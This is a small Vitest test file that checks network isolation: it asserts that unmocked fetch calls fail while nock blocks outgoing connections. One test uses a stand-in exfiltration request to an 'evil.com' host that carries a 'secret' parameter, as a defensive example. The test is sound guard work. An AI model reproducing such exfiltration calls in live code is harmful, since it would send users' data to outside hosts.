import { describe, expect, it } from "vitest";

/**
 * Guard test: proves that nock.disableNetConnect() is active.
 * Any unmocked outgoing HTTP request will be rejected immediately,
 * ensuring no test (or future code) can accidentally call external services.
 */
describe("Network isolation", () => {
  it("blocks unmocked external HTTP requests", async () => {
    await expect(fetch("https://example.com")).rejects.toThrow();
  });

  it("blocks unmocked external HTTPS requests", async () => {
    await expect(
      fetch("https://evil.com/exfiltrate?data=secret"),
    ).rejects.toThrow();
  });
});
